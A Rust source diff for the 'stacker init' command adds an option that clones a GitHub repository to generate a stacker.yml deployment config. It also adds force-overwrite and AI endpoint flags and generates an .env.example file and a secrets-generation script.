@@ -1,3 +1,4 @@
+use std::collections::{BTreeMap, HashMap};
 use std::convert::TryFrom;
 use std::io::{self, IsTerminal, Write};
 use std::path::{Path, PathBuf};
@@ -133,7 +134,7 @@ pub fn full_config_reference_example() -> &'static str {
 # -----------------------------------------------------------------------------"#
 }
 
-/// `stacker init [--type static|node|python|rust|go|php] [--with-proxy] [--with-ai]`
+/// `stacker init [--type static|node|python|rust|go|php] [--with-proxy] [--with-ai] [--from-github URL]`
 ///
 /// Detects the project type in the current directory and generates
 /// a `stacker.yml` configuration file with sensible defaults.
@@ -142,17 +143,27 @@ pub fn full_config_reference_example() -> &'static str {
 /// or environment variables), Stacker scans the project deeply and
 /// sends the context to the AI to generate a tailored `stacker.yml`
 /// with appropriate services, proxy, monitoring, etc.
+///
+/// When `--from-github` is used, Stacker clones the specified GitHub
+/// repository into a temp directory, detects the project type and
+/// services, and generates a `stacker.yml` in the current directory.
 pub struct InitCommand {
     pub app_type: Option<String>,
     pub with_proxy: bool,
     pub with_ai: bool,
     pub with_cloud: bool,
+    /// GitHub repository URL (owner/repo or full URL) to generate config from
+    pub from_github: Option<String>,
+    /// Overwrite existing stacker.yml if present
+    pub force: bool,
     /// Override AI provider (openai, anthropic, ollama, custom)
     pub ai_provider: Option<String>,
     /// Override AI model name
     pub ai_model: Option<String>,
     /// Override AI API key
     pub ai_api_key: Option<String>,
+    /// Override AI endpoint URL (e.g. http://localhost:11434 for Ollama)
+    pub ai_endpoint: Option<String>,
 }
 
 impl InitCommand {
@@ -167,10 +178,23 @@ impl InitCommand {
             with_proxy,
             with_ai,
             with_cloud,
+            from_github: None,
+            force: false,
             ai_provider: None,
             ai_model: None,
             ai_api_key: None,
+            ai_endpoint: None,
         }
+    }
+
+    pub fn with_from_github(mut self, from_github: Option<String>) -> Self {
+        self.from_github = from_github;
+        self
+    }
+
+    pub fn with_force(mut self, force: bool) -> Self {
+        self.force = force;
+        self
     }
 
     pub fn with_ai_options(
@@ -178,10 +202,12 @@ impl InitCommand {
         provider: Option<String>,
         model: Option<String>,
         api_key: Option<String>,
+        endpoint: Option<String>,
     ) -> Self {
         self.ai_provider = provider;
         self.ai_model = model;
         self.ai_api_key = api_key;
+        self.ai_endpoint = endpoint;
         self
     }
 }
@@ -437,6 +463,7 @@ pub fn resolve_ai_config(
     ai_provider: Option<&str>,
     ai_model: Option<&str>,
     ai_api_key: Option<&str>,
+    ai_endpoint: Option<&str>,
 ) -> Result<AiConfig, CliError> {
     // Provider: flag > env > default (ollama)
     let provider_str = ai_provider
@@ -461,8 +488,16 @@ pub fn resolve_ai_config(
         .map(|s| s.to_string())
         .or_else(|| std::env::var("STACKER_AI_MODEL").ok());
 
-    // Endpoint from env
-    let endpoint = std::env::var("STACKER_AI_ENDPOINT").ok();
+    // Endpoint: flag > env (only for ollama/custom — openai/anthropic
+    // have well-known defaults that should not be overridden by env).
+    let endpoint = ai_endpoint.map(|s| s.to_string()).or_else(|| {
+        match provider {
+            AiProviderType::Ollama | AiProviderType::Custom => {
+                std::env::var("STACKER_AI_ENDPOINT").ok()
+            }
+            _ => None,
+        }
+    });
 
     // Timeout: env > default (300s)
     let timeout = std::env::var("STACKER_AI_TIMEOUT")
@@ -508,12 +543,13 @@ pub fn generate_config(
     app_type_override: Option<&str>,
     with_proxy: bool,
     with_ai: bool,
+    force: bool,
 ) -> Result<PathBuf, CliError> {
     let config_path = project_dir.join(DEFAULT_CONFIG_FILE);
 
-    if config_path.exists() {
+    if config_path.exists() && !force {
         return Err(CliError::ConfigValidation(format!(
-            "{} already exists. Remove it first or edit it directly.",
+            "{} already exists. Remove it first, use --force to overwrite, or edit it directly.",
             DEFAULT_CONFIG_FILE
         )));
     }
@@ -536,20 +572,39 @@ pub fn generate_config_full(
     ai_provider: Option<&str>,
     ai_model: Option<&str>,
     ai_api_key: Option<&str>,
+    ai_endpoint: Option<&str>,
+    force: bool,
 ) -> Result<PathBuf, CliError> {
     let config_path = project_dir.join(DEFAULT_CONFIG_FILE);
 
     // Don't overwrite existing config
-    if config_path.exists() {
+    if config_path.exists() && !force {
         return Err(CliError::ConfigValidation(format!(
-            "{} already exists. Remove it first or edit it directly.",
+            "{} already exists. Remove it first, use --force to overwrite, or edit it directly.",
             DEFAULT_CONFIG_FILE
         )));
     }
 
     // If --with-ai is set, try AI-powered generation
     if with_ai {
-        let ai_config = resolve_ai_config(ai_provider, ai_model, ai_api_key)?;
+        let mut ai_config = resolve_ai_config(ai_provider, ai_model, ai_api_key, ai_endpoint)?;
+
+        // If no provider was explicitly specified, check existing stacker.yml
+        if ai_provider.is_none()
+            && ai_model.is_none()
+            && ai_api_key.is_none()
+            && ai_endpoint.is_none()
+            && config_path.exists()
+        {
+            if let Ok(existing) = StackerConfig::from_file(&config_path) {
+                if existing.ai.enabled {
+                    ai_config.provider = existing.ai.provider;
+                    if existing.ai.model.is_some() { ai_config.model = existing.ai.model; }
+                    if existing.ai.api_key.is_some() { ai_config.api_key = existing.ai.api_key; }
+                    if existing.ai.endpoint.is_some() { ai_config.endpoint = existing.ai.endpoint; }
+                }
+            }
+        }
 
         match create_provider(&ai_config) {
             Ok(provider) => {
@@ -691,6 +746,10 @@ fn generate_config_template_path(
         if let Some(dockerfile) = &app.dockerfile {
             builder = builder.app_dockerfile(dockerfile.clone());
         }
+    } else if workspace_detection.root.has_dockerfile {
+        // When no DiscoveredApp exists at root (e.g. repo with Dockerfile
+        // but no language markers), fall back to the root-level Dockerfile.
+        builder = builder.app_dockerfile(PathBuf::from("Dockerfile"));
     }
 
     for service in importable_compose_services(&workspace_detection, primary_app) {
@@ -827,6 +886,16 @@ fn choose_primary_app(workspace_detection: &WorkspaceDetection) -> Option<&Disco
                 .find(|app| stack.services.iter().any(|service| service == &app.name))
             {
                 return Some(app);
+            }
+
+            // The recommended compose file is at the project root (just a
+            // filename, no subdirectory prefix) and contains services that
+            // do not match any discovered app. Fall back to the root
+            // project context instead of picking an unrelated subdirectory
+            // app — the compose defines what the project does, not the
+            // subdirectory crates.
+            if compose_file.components().count() == 1 && !stack.services.is_empty() {
+                return None;
             }
         }
     }
@@ -1028,13 +1097,22 @@ fn compose_service_to_definition(
     service: &DetectedComposeService,
     primary_app_name: Option<&str>,
 ) -> Option<ServiceDefinition> {
+    use crate::cli::github_fetcher::{default_healthcheck, is_infra_image};
+
     if primary_app_name == Some(service.name.as_str()) {
         return None;
     }
 
+    let image = normalize_compose_string(&service.image.clone()?)?;
+    let healthcheck = if is_infra_image(&image) {
+        default_healthcheck(&image)
+    } else {
+        None
+    };
+
     Some(ServiceDefinition {
         name: service.name.clone(),
-        image: normalize_compose_string(&service.image.clone()?)?,
+        image,
         ports: service
             .ports
             .iter()
@@ -1051,6 +1129,8 @@ fn compose_service_to_definition(
             .filter_map(|value| normalize_compose_string(value))
             .collect(),
         depends_on: service.depends_on.clone(),
+        command: None,
+        healthcheck,
     })
 }
 
@@ -1080,6 +1160,531 @@ fn normalize_compose_string(value: &str) -> Option<String> {
 
 /// Output directory for generated artifacts.
 const OUTPUT_DIR: &str = ".stacker";
+
+/// Clone a GitHub repo to a temp directory and generate `stacker.yml` in the
+/// target project directory.
+///
+/// The repo is cloned as a shallow clone (depth 1) for speed, then the
+/// existing local detection and config generation pipeline is reused as-is.
+/// When `with_ai` is enabled, the AI scans the cloned repo (Dockerfile,
+/// compose, README, package.json, etc.) to generate a context-aware config
+/// with ports, env vars, and services inferred from the project's own
+/// documentation and source.
+pub fn generate_config_from_github(
+    project_dir: &Path,
+    url: &str,
+    app_type_override: Option<&str>,
+    with_proxy: bool,
+    with_ai: bool,
+    ai_provider: Option<&str>,
+    ai_model: Option<&str>,
+    ai_api_key: Option<&str>,
+    ai_endpoint: Option<&str>,
+    force: bool,
+) -> Result<PathBuf, CliError> {
+    use crate::cli::github_fetcher::parse_github_url;
+    use std::process::Command;
+
+    let (owner, repo) = parse_github_url(url)?;
+    let clone_url = format!("https://github.com/{}/{}.git", owner, repo);
+    let target_config_path = project_dir.join(DEFAULT_CONFIG_FILE);
+
+    if target_config_path.exists() && !force {
+        return Err(CliError::ConfigValidation(format!(
+            "{} already exists. Remove it first, use --force to overwrite, or edit it directly.",
+            DEFAULT_CONFIG_FILE
+        )));
+    }
+
+    let temp_dir = tempfile::tempdir().map_err(|e| {
+        CliError::ConfigValidation(format!("Failed to create temp directory: {}", e))
+    })?;
+    let cloned_path = temp_dir.path().join(&repo);
+
+    eprintln!(
+        "⬇ Fetching {}/{}...",
+        owner, repo
+    );
+
+    let output = Command::new("git")
+        .args([
+            "clone",
+            "--depth",
+            "1",
+            "--single-branch",
+            &clone_url,
+        ])
+        .arg(&cloned_path)
+        .output()
+        .map_err(|e| {
+            CliError::ConfigValidation(format!(
+                "Failed to run git clone: {}. Is git installed?",
+                e
+            ))
+        })?;
+
+    if !output.status.success() {
+        let stderr = String::from_utf8_lossy(&output.stderr);
+        // Try without --single-branch as fallback (some repos don't have a default branch set)
+        if stderr.contains("Remote branch") && stderr.contains("not found") {
+            eprintln!("  Retrying without --single-branch...");
+            let output2 = Command::new("git")
+                .args(["clone", "--depth", "1", &clone_url])
+                .arg(&cloned_path)
+                .output()
+                .map_err(|e| {
+                    CliError::ConfigValidation(format!("Failed to run git clone: {}", e))
+                })?;
+
+            if !output2.status.success() {
+                let stderr2 = String::from_utf8_lossy(&output2.stderr);
+                return Err(CliError::ConfigValidation(format!(
+                    "git clone failed for {}/{}: {}",
+                    owner, repo, stderr2.trim()
+                )));
+            }
+        } else {
+            return Err(CliError::ConfigValidation(format!(
+                "git clone failed for {}/{}: {}",
+                owner, repo, stderr.trim()
+            )));
+        }
+    }
+
+    eprintln!("✓ Cloned {}/{} into {}", owner, repo, cloned_path.display());
+
+    // Generate config — prefer AI when available (reads README, compose,
+    // Dockerfile for better context), fall back to template detection.
+    let temp_config_path = cloned_path.join(DEFAULT_CONFIG_FILE);
+    let (result, used_ai) = if with_ai {
+        // Resolve AI config: CLI flags > env vars > existing stacker.yml > defaults
+        let mut ai_config = resolve_ai_config(ai_provider, ai_model, ai_api_key, ai_endpoint)?;
+
+        // If no provider was explicitly specified, check the existing stacker.yml
+        // in the target directory (set up via `stacker config setup ai`).
+        if ai_provider.is_none()
+            && ai_model.is_none()
+            && ai_api_key.is_none()
+            && ai_endpoint.is_none()
+        {
+            let existing_yaml = project_dir.join(DEFAULT_CONFIG_FILE);
+            if existing_yaml.exists() {
+                if let Ok(existing) = StackerConfig::from_file(&existing_yaml) {
+                    if existing.ai.enabled {
+                        ai_config.provider = existing.ai.provider;
+                        if existing.ai.model.is_some() {
+                            ai_config.model = existing.ai.model;
+                        }
+                        if existing.ai.api_key.is_some() {
+                            ai_config.api_key = existing.ai.api_key;
+                        }
+                        if existing.ai.endpoint.is_some() {
+                            ai_config.endpoint = existing.ai.endpoint;
+                        }
+                        eprintln!("🤖 Using AI config from existing stacker.yml (provider: {})",
+                            ai_config.provider);
+                    }
+                }
+            }
+        }
+
+        match create_provider(&ai_config) {
+            Ok(provider) => {
+                eprintln!("🤖 Generating config with AI ({} — {})...",
+                    ai_config.provider,
+                    ai_config.model.as_deref().unwrap_or("default"));
+                match generate_config_ai_path(
+                    &cloned_path,
+                    &temp_config_path,
+                    provider.as_ref(),
+                    &ai_config,
+                ) {
+                    Ok(path) => (Ok(path), true),
+                    Err(e) => {
+                        eprintln!("⚠ AI generation failed: {}", e);
+
+                        // Try converting compose-format output before falling back
+                        let draft_path = cloned_path.join("stacker.yml.ai-draft");
+                        let mut converted = false;
+                        if let Ok(draft) = std::fs::read_to_string(&draft_path) {
+                            if let Some(cfg) = convert_compose_to_stacker(&draft, &repo) {
+                                let yaml = serialize_generated_config(&cfg).unwrap_or_default();
+                                let _ = std::fs::write(&temp_config_path, &yaml);
+                                eprintln!("  ✓ Converted docker-compose output to stacker.yml format.");
+                                converted = true;
+                            }
+                        }
+
+                        if converted {
+                            (Ok(temp_config_path), true)
+                        } else {
+                            eprintln!("  Falling back to template-based generation.");
+                            eprintln!("  Tip: make sure your Ollama model supports code generation.");
+                            eprintln!("  Available models: ollama list\n");
+                            (generate_config_template_path(
+                                &cloned_path,
+                                &temp_config_path,
+                                app_type_override,
+                                with_proxy,
+                                with_ai,
+                            ), false)
+                        }
+                    }
+                }
+            }
+            Err(e) => {
+                eprintln!("⚠ AI provider not available: {}", e);
+                eprintln!("  Falling back to template-based generation.");
+                eprintln!("  Tip: start Ollama with: ollama serve\n");
+                (generate_config_template_path(
+                    &cloned_path,
+                    &temp_config_path,
+                    app_type_override,
+                    with_proxy,
+                    with_ai,
+                ), false)
+            }
+        }
+    } else {
+        (generate_config_template_path(
+            &cloned_path,
+            &temp_config_path,
+            app_type_override,
+            with_proxy,
+            with_ai,
+        ), false)
+    };
+
+    match result {
+        Ok(temp_path) => {
+            // Load the generated config, strip the compose_file reference
+            // (it points into the temp clone that will be cleaned up), and
+            // rewrite the cleaned config to the target project directory.
+            let mut config = StackerConfig::from_file(&temp_path)?;
+            let was_ai = used_ai;
+            config.deploy.compose_file = None;
+
+            // Post-process AI output: move the main app from services to
+            // app.image block, filter unsupported port ranges.
+            if was_ai {
+                sanitize_ai_config(&mut config, &repo);
+            }
+
+            let cleaned_yaml = serialize_generated_config(&config)?;
+            let method = if used_ai { "stacker init --from-github --with-ai" }
+                         else { "stacker init --from-github" };
+            let content = format!(
+                "# Stacker configuration — generated by `{method} {owner}/{repo}`\n\
+                 # Docs: https://docs.try.direct/stacker\n\
+                 \n\
+                 {yaml}",
+                owner = owner, repo = repo, yaml = cleaned_yaml, method = method
+            );
+            std::fs::write(&target_config_path, &content).map_err(|e| {
+                CliError::ConfigValidation(format!(
+                    "Failed to write {}: {}",
+                    DEFAULT_CONFIG_FILE, e
+                ))
+            })?;
+
+            // Generate .stacker/ directory with Dockerfile and
+            // docker-compose.yml so the user can deploy immediately.
+            let output_dir = project_dir.join(OUTPUT_DIR);
+            std::fs::create_dir_all(&output_dir)?;
+
+            let needs_dockerfile = config.app.image.is_none() && config.app.dockerfile.is_none();
+            if needs_dockerfile {
+                let dockerfile_path = output_dir.join("Dockerfile");
+                let builder = DockerfileBuilder::for_project(&cloned_path, config.app.app_type);
+                builder.write_to(&dockerfile_path, force)?;
+                eprintln!("✓ Generated {}/Dockerfile", OUTPUT_DIR);
+            }
+
+            if config.deploy.compose_file.is_none() {
+                let compose_path = output_dir.join("docker-compose.yml");
+                let compose = ComposeDefinition::try_from(&config)?;
+                compose.write_to(&compose_path, force)?;
+                eprintln!("✓ Generated {}/docker-compose.yml", OUTPUT_DIR);
+            }
+
+            // Generate .env.example and scripts/generate-secrets.sh from
+            // the detected environment variables in the generated config.
+            // Always produce the files for --from-github — even an empty
+            // template gives the user a starting point to add their own vars.
+            let mut env_vars = std::collections::HashMap::new();
+            for (key, value) in &config.app.environment {
+                env_vars.insert(key.clone(), value.clone());
+            }
+            for service in &config.services {
+                for (key, value) in &service.environment {
+                    env_vars.insert(key.clone(), value.clone());
+                }
+            }
+
+            let env_example_path = project_dir.join(".env.example");
+            let env_content = if env_vars.is_empty() {
+                "# Add your environment variables below, one per line.\n\
+                 # Example:\n\
+                 #   DATABASE_URL=postgres://user:password@host:5432/db\n\
+                 #   APP_PORT=8080\n\
+                 \n"
+                    .to_string()
+            } else {
+                generate_env_example_content(&env_vars)
+            };
+            std::fs::write(&env_example_path, &env_content).map_err(|e| {
+                CliError::ConfigValidation(format!(
+                    "Failed to write .env.example: {}",
+                    e
+                ))
+            })?;
+            eprintln!("✓ Generated .env.example");
+
+                let scripts_dir = project_dir.join("scripts");
+                std::fs::create_dir_all(&scripts_dir).ok();
+                let script_path = scripts_dir.join("generate-secrets.sh");
+                let script_content = generate_secrets_script_content(&env_content);
+                std::fs::write(&script_path, &script_content).map_err(|e| {
+                    CliError::ConfigValidation(format!(
+                        "Failed to write scripts/generate-secrets.sh: {}",
+                        e
+                    ))
+                })?;
+
+                #[cfg(unix)]
+                {
+                    use std::os::unix::fs::PermissionsExt;
+                    let _ = std::fs::set_permissions(
+                        &script_path,
+                        std::fs::Permissions::from_mode(0o755),
+                    );
+                }
+                eprintln!("✓ Generated scripts/generate-secrets.sh");
+
+            Ok(target_config_path)
+        }
+        Err(e) => Err(e),
+    }
+}
+
+/// Post-process AI-generated config to fix common model mistakes:
+/// - Move the main app from `services:` to `app.image:` when a service
+///   matches the repo name and has a public image.
+/// - Strip port ranges (e.g. 6379-6399:6379-6399) which Stacker cannot parse.
+fn sanitize_ai_config(config: &mut StackerConfig, repo_name: &str) {
+    use crate::cli::github_fetcher::is_infra_image;
+
+    // ── Move main app service to app.image ──
+    // Priority: exact repo name match → common AI service names → sole non-infra service.
+    if config.app.image.is_none() {
+        const COMMON_APP_NAMES: &[&str] = &["app", "web", "server", "api", "backend", "frontend"];
+
+        let pos = config
+            .services
+            .iter()
+            .position(|svc| svc.name == repo_name && !svc.image.is_empty())
+            .or_else(|| {
+                config.services.iter().position(|svc| {
+                    !svc.image.is_empty()
+                        && COMMON_APP_NAMES.contains(&svc.name.as_str())
+                        && !is_infra_image(&svc.image)
+                })
+            })
+            .or_else(|| {
+                // Fall back to the sole non-infra service when there is exactly one.
+                let non_infra: Vec<usize> = config
+                    .services
+                    .iter()
+                    .enumerate()
+                    .filter(|(_, svc)| !svc.image.is_empty() && !is_infra_image(&svc.image))
+                    .map(|(i, _)| i)
+                    .collect();
+                if non_infra.len() == 1 { Some(non_infra[0]) } else { None }
+            });
+
+        if let Some(pos) = pos {
+            let svc = config.services.remove(pos);
+            config.app.image = Some(svc.image.clone());
+            config.app.app_type = AppType::Custom;
+
+            if config.app.ports.is_empty() {
+                config.app.ports = svc.ports.clone();
+            }
+            if config.app.volumes.is_empty() {
+                config.app.volumes = svc.volumes.clone();
+            }
+            if config.app.environment.is_empty() {
+                config.app.environment = svc.environment.clone();
+            }
+            // Always clear dockerfile when a pre-built image is set —
+            // the slash check missed official Docker Hub images like redis:7.
+            config.app.dockerfile = None;
+        }
+    }
+
+    // ── Strip port ranges from all ports lists ──
+    fn is_port_range(port: &str) -> bool {
+        port.contains('-')
+    }
+
+    config.app.ports.retain(|p| !is_port_range(p));
+    for svc in &mut config.services {
+        svc.ports.retain(|p| !is_port_range(p));
+    }
+}
+
+/// Convert docker-compose YAML output to stacker.yml format.
+/// Some models output compose format despite the system prompt.
+fn convert_compose_to_stacker(
+    ai_output: &str,
+    repo_name: &str,
+) -> Option<StackerConfig> {
+    use crate::cli::github_fetcher::is_infra_image;
+    use std::collections::HashMap;
+
+    let parsed: serde_yaml::Value = serde_yaml::from_str(ai_output).ok()?;
+
+    let is_compose = parsed.get("version").is_some()
+        || parsed.get("services").and_then(|s| s.as_mapping()).map_or(false, |m| {
+            m.values().any(|v| v.get("build").is_some() && v.get("image").is_none())
+        });
+
+    if !is_compose {
+        return None;
+    }
+
+    let services = parsed.get("services")?.as_mapping()?;
+    if services.is_empty() {
+        return None;
+    }
+
+    let mut app_image: Option<String> = None;
+    let mut app_ports: Vec<String> = Vec::new();
+    let mut app_volumes: Vec<String> = Vec::new();
+    let mut app_env: HashMap<String, String> = HashMap::new();
+    let mut infra_services: Vec<ServiceDefinition> = Vec::new();
+
+    for (name, svc_val) in services {
+        let name = match name.as_str() {
+            Some(s) => s.to_string(),
+            None => continue,
+        };
+        let svc = match svc_val.as_mapping() {
+            Some(m) => m,
+            None => continue,
+        };
+        let image = svc.get("image").and_then(|v| v.as_str()).map(|s| s.to_string());
+
+        if let Some(ref img) = image {
+            if is_infra_image(img) {
+                infra_services.push(ServiceDefinition {
+                    name,
+                    image: img.clone(),
+                    ports: extract_yaml_strings(svc.get("ports")),
+                    environment: extract_yaml_env(svc.get("environment")),
+                    volumes: extract_yaml_strings(svc.get("volumes")),
+                    depends_on: extract_yaml_strings(svc.get("depends_on")),
+                    command: None,
+                    healthcheck: crate::cli::github_fetcher::default_healthcheck(img),
+                });
+            } else {
+                app_image = Some(img.clone());
+                app_ports = extract_yaml_strings(svc.get("ports"));
+                app_volumes = extract_yaml_strings(svc.get("volumes"));
+                app_env = extract_yaml_env(svc.get("environment"));
+            }
+        } else if name == repo_name || app_image.is_none() {
+            app_ports = extract_yaml_strings(svc.get("ports"));
+            app_volumes = extract_yaml_strings(svc.get("volumes"));
+            app_env = extract_yaml_env(svc.get("environment"));
+        }
+    }
+
+    let mut config = StackerConfig {
+        name: repo_name.to_string(),
+        version: None,
+        organization: None,
+        project: crate::cli::config_parser::ProjectConfig { identity: None },
+        app: crate::cli::config_parser::AppSource {
+            app_type: AppType::Custom,
+            path: PathBuf::from("."),
+            dockerfile: app_image.is_none().then(|| PathBuf::from("Dockerfile")),
+            image: app_image,
+            build: None,
+            ports: app_ports,
+            volumes: app_volumes,
+            environment: app_env,
+            command: None,
+            healthcheck: None,
+        },
+        services: infra_services,
+        proxy: crate::cli::config_parser::ProxyConfig::default(),
+        deploy: crate::cli::config_parser::DeployConfig {
+            target: crate::cli::config_parser::DeployTarget::Local,
+            ..Default::default()
+        },
+        install: crate::cli::config_parser::InstallConfig::default(),
+        environments: BTreeMap::new(),
+        ai: crate::cli::config_parser::AiConfig::default(),
+        monitoring: crate::cli::config_parser::MonitoringConfig {
+            status_panel: false,
+            ..Default::default()
+        },
+        hooks: crate::cli::config_parser::HookConfig::default(),
+        env_file: None,
+        env: HashMap::new(),
+        config_contract: crate::cli::config_parser::ConfigContract::default(),
+        origin: crate::cli::config_parser::ConfigOrigin::UserAuthored,
+    };
+
+    // Strip port ranges
+    config.app.ports.retain(|p| !p.contains('-'));
+    for svc in &mut config.services {
+        svc.ports.retain(|p| !p.contains('-'));
+    }
+
+    Some(config)
+}
+
+fn extract_yaml_strings(value: Option<&serde_yaml::Value>) -> Vec<String> {
+    match value {
+        Some(serde_yaml::Value::Sequence(seq)) => seq
+            .iter()
+            .filter_map(|v| v.as_str().map(|s| s.to_string()))
+            .collect(),
+        _ => Vec::new(),
+    }
+}
+
+fn extract_yaml_env(value: Option<&serde_yaml::Value>) -> HashMap<String, String> {
+    let mut env = HashMap::new();
+    match value {
+        Some(serde_yaml::Value::Mapping(m)) => {
+            for (k, v) in m {
+                if let Some(key) = k.as_str() {
+                    let val = match v {
+                        serde_yaml::Value::String(s) => s.clone(),
+                        serde_yaml::Value::Number(n) => n.to_string(),
+                        serde_yaml::Value::Bool(b) => b.to_string(),
+                        _ => continue,
+                    };
+                    env.insert(key.to_string(), val);
+                }
+            }
+        }
+        Some(serde_yaml::Value::Sequence(seq)) => {
+            for item in seq {
+                if let Some(line) = item.as_str() {
+                    if let Some((k, v)) = line.split_once('=') {
+                        env.insert(k.to_string(), v.to_string());
+                    }
+                }
+            }
+        }
+        _ => {}
+    }
+    env
+}
 
 fn summarize_top_level_entries(project_dir: &Path, limit: usize) -> String {
     let mut entries: Vec<String> = match std::fs::read_dir(project_dir) {
@@ -1270,29 +1875,141 @@ fn generate_compose_with_ai(
     Ok(compose)
 }
 
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// Env file generation helpers
+// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+/// Returns `true` when the environment variable key looks like a secret
+/// (password, key, secret, token).
+pub fn is_secret_env_key(key: &str) -> bool {
+    let lower = key.to_lowercase();
+    lower.contains("password")
+        || lower.contains("secret")
+        || lower.contains("_key")
+        || lower.contains("token")
+}
+
+/// Generate `.env.example` content from detected environment variables.
+/// Known/default values are preserved; secret-looking keys are emptied.
+pub fn generate_env_example_content(env_vars: &std::collections::HashMap<String, String>) -> String {
+    let mut lines = vec![
+        "# Copy to .env and generate secrets before first deploy:".to_string(),
+        "#   cp .env.example .env && ./scripts/generate-secrets.sh".to_string(),
+        String::new(),
+    ];
+
+    let mut sorted: Vec<_> = env_vars.iter().collect();
+    sorted.sort_by(|a, b| a.0.cmp(b.0));
+
+    for (key, value) in sorted {
+        if is_secret_env_key(key) {
+            lines.push(format!("{}=", key));
+        } else {
+            lines.push(format!("{}={}", key, value));
+        }
+    }
+
+    lines.push(String::new());
+    lines.join("\n")
+}
+
+/// Generate `scripts/generate-secrets.sh` content that uses `openssl rand -hex`
+/// to fill missing secret values in `.env`.
+pub fn generate_secrets_script_content(env_file_content: &str) -> String {
+    let mut lines = vec![
+        "#!/bin/bash".to_string(),
+        "set -euo pipefail".to_string(),
+        format!(
+            "cd \"$(dirname \"$0\")/..\"",
+        ),
+        String::new(),
+    ];
+
+    // Only generate secrets for keys that are empty in the env file
+    for env_line in env_file_content.lines() {
+        let trimmed = env_line.trim();
+        if trimmed.is_empty() || trimmed.starts_with('#') {
+            continue;
+        }
+        let parts: Vec<&str> = trimmed.splitn(2, '=').collect();
+        if parts.len() != 2 || parts[0].is_empty() {
+            continue;
+        }
+        let key = parts[0].trim();
+        let value = parts[1].trim();
+
+        // Only allow safe identifier characters — reject keys with shell metacharacters.
+        if !key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
+            continue;
+        }
+
+        if value.is_empty() && is_secret_env_key(key) {
+            lines.push(format!(
+                r#"echo ":: Generating {}...""#,
+                key
+            ));
+            lines.push(format!(
+                r#"CURRENT=$(grep "^{}=" .env 2>/dev/null | cut -d= -f2- || true)"#,
+                key
+            ));
+            lines.push(format!(
+                r#"if [ -z "$CURRENT" ]; then"#
+            ));
+            lines.push(format!(
+                r#"  sed -i'.bak' "s/^{}=.*/{}=$(openssl rand -hex 16)/" .env 2>/dev/null || sed -i '' "s/^{}=.*/{}=$(openssl rand -hex 16)/" .env"#,
+                key, key, key, key
+            ));
+            lines.push(format!(r#"fi"#));
+            lines.push(String::new());
+        }
+    }
+
+    lines.join("\n")
+}
+
 impl CallableTrait for InitCommand {
     fn call(&self) -> Result<(), Box<dyn std::error::Error>> {
         let project_dir = std::env::current_dir()?;
 
-        let config_path = generate_config_full(
-            &project_dir,
-            self.app_type.as_deref(),
-            self.with_proxy,
-            self.with_ai,
-            self.ai_provider.as_deref(),
-            self.ai_model.as_deref(),
-            self.ai_api_key.as_deref(),
-        )?;
+        let config_path = if let Some(ref url) = self.from_github {
+            generate_config_from_github(
+                &project_dir,
+                url,
+                self.app_type.as_deref(),
+                self.with_proxy,
+                self.with_ai,
+                self.ai_provider.as_deref(),
+                self.ai_model.as_deref(),
+                self.ai_api_key.as_deref(),
+                self.ai_endpoint.as_deref(),
+                self.force,
+            )?
+        } else {
+            generate_config_full(
+                &project_dir,
+                self.app_type.as_deref(),
+                self.with_proxy,
+                self.with_ai,
+                self.ai_provider.as_deref(),
+                self.ai_model.as_deref(),
+                self.ai_api_key.as_deref(),
+                self.ai_endpoint.as_deref(),
+                self.force,
+            )?
+        };
 
         eprintln!("✓ Created {}", config_path.display());
 
-        if self.with_cloud {
-            eprintln!("☁ Running cloud setup wizard...");
-            let path_str = config_path.to_string_lossy().to_string();
-            let applied =
-                crate::console::commands::cli::config::run_setup_cloud_interactive(&path_str)?;
-            for item in applied {
-                eprintln!("  - {}", item);
+        // Cloud wizard and .stacker/ generation are only relevant for local init.
+        if self.from_github.is_none() {
+            if self.with_cloud {
+                eprintln!("☁ Running cloud setup wizard...");
+                let path_str = config_path.to_string_lossy().to_string();
+                let applied =
+                    crate::console::commands::cli::config::run_setup_cloud_interactive(&path_str)?;
+                for item in applied {
+                    eprintln!("  - {}", item);
+                }
             }
         }
 
@@ -1319,15 +2036,19 @@ impl CallableTrait for InitCommand {
         }
 
         // Generate .stacker/ directory with Dockerfile and docker-compose.yml
+        // (skipped for --from-github since the artifacts would reference a temp dir)
         let output_dir = project_dir.join(OUTPUT_DIR);
-        std::fs::create_dir_all(&output_dir)?;
 
-        // Optional AI provider for artifact generation
-        let ai_runtime = if self.with_ai {
+        if self.from_github.is_none() {
+            std::fs::create_dir_all(&output_dir)?;
+
+            // Optional AI provider for artifact generation
+            let ai_runtime = if self.with_ai {
             match resolve_ai_config(
                 self.ai_provider.as_deref(),
                 self.ai_model.as_deref(),
                 self.ai_api_key.as_deref(),
+                self.ai_endpoint.as_deref(),
             ) {
                 Ok(ai_cfg) => match create_provider(&ai_cfg) {
                     Ok(provider) => Some((ai_cfg, provider)),
@@ -1420,16 +2141,26 @@ impl CallableTrait for InitCommand {
         eprintln!("  stacker config validate   # Check configuration");
         eprintln!("  stacker deploy --target local --dry-run   # Preview deployment");
         eprintln!("  stacker deploy --target local   # Deploy locally");
+        eprintln!("\n  Deploy anywhere with a free account:");
+        eprintln!("  stacker login              # Free tier — 20 deploys/mo, 1 cloud provider");
+        eprintln!("  stacker agent status       # Remote monitoring via Status Panel");
 
-        if self.with_ai {
-            maybe_bootstrap_website_scenario(
-                &project_dir,
-                &config_path,
-                &config,
-                ai_runtime
-                    .as_ref()
-                    .map(|(cfg, provider)| (cfg, provider.as_ref())),
-            )?;
+            if self.with_ai {
+                maybe_bootstrap_website_scenario(
+                    &project_dir,
+                    &config_path,
+                    &config,
+                    ai_runtime
+                        .as_ref()
+                        .map(|(cfg, provider)| (cfg, provider.as_ref())),
+                )?;
+            }
+        } else {
+            // --from-github path: only generate stacker.yml, no .stacker/ dir
+            eprintln!("\nNext steps:");
+            eprintln!("  stacker config validate   # Check configuration");
+            eprintln!("  stacker deploy --target local --dry-run   # Preview deployment");
+            eprintln!("  stacker deploy --target local   # Deploy locally");
         }
 
         Ok(())
@@ -1443,6 +2174,7 @@ impl CallableTrait for InitCommand {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::cli::detector::{ComposeStack, DetectedComposeService, DiscoveredApp, ProjectDetection, WorkspaceDetection};
     use tempfile::TempDir;
 
     struct MockAiProvider {
@@ -1500,7 +2232,7 @@ mod tests {
